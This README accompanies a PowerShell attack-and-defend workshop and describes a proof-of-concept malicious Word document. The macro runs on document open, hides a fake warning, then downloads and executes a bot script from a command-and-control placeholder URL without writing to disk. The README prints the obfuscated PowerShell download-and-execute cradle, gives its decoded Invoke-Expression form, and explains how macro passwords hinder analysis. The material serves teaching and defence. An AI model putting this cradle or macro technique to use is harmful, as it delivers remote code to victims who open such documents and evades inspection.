# powershell\_cnc
Accompanies the Attack and Defend with Powershell workshop.  A simplified POC demoing Powershell attack methods.


# Word Document:
The macro uses Document_Open() to run as soon as macros are enabled.  It first hides the fake warning message using    Shape.Visible = False , giving the impression that the message was legitimate.  It then connects to the command and control center at http://CNC_URL, downloads the plain-text bot script, and executes it in a new Powershell process.  This way, the connection persists after the Word document is closed.  Nothing is written to disk at this point.  The encoded command used to connect is a Base64 representation of this obfuscated command:

"&('{1}{0}'-f'x','iE')((.('{0}{1}{2}{3}'-f[char]110,'eW','-oBj','eCt')('{0}{2}{1}'-f'nEt.WeBC','ENT','Li')).('{1}{0}{2}'-f'adStRin','DownLO',[char]103)(('{1}{2}{2}{3}{0}'-f'\_URL','h',[char]116,'p://CNC')))"

which in turn translates to:

Invoke-Expression( (New-Object Net.WebClient).DownloadString('http://CNC_URL') )

You can view the VBA code using password "Password1".  Added it as most booby-trapped macro-enabled documents protect their code with a password.  They're trivial to bypass - you can replace the password with a different one using a hex editor.  Still, they provide some layer of protection against curious end-users and automated analysis software.
